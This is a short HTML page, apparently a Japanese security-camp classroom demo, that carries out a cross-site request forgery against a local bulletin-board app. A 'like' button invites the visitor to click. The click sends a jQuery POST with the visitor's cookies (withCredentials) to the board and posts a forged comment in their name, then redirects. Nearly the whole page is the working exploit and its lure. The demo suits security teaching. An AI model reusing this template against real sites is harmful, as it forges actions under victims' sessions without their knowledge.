<!DOCTYPE html>
<html lang="ja">
    <head>
        <script src="./static/js/jquery.min.js"></script>
        <script>
            $(document).ready(
                function () {
                    var csrfAjaxPost = function (post_data) {
                        $.ajax({
                            type: "POST",
                            url: "http://raspi00.local:8086/bbs",
                            data: post_data,
                            success: function () {
                                document.location = "http://raspi00.local:8090/csrf"
                            },
                            // for sending Cookie by POST request
                            xhrFields: {
                                withCredentials: true
                            }
                        });
                    };
                    $(".csrf").click(
                        function () {
                            csrfAjaxPost(
                                {"comment":"本日，セキュリティキャンプin九州のみんなに焼き肉を奢ります！"}
                            );
                            return false;
                        }
                    );
                }
            );
        </script>
    </head>
    <body>
        <div id="container" class="pur-g">
            これ本当に押してみて！<br/>
            <a class="csrf">
                <button>
                    <img src="/static/img/like.jpg">
                </button>
            </a>
        </div>
    </body>
</html>

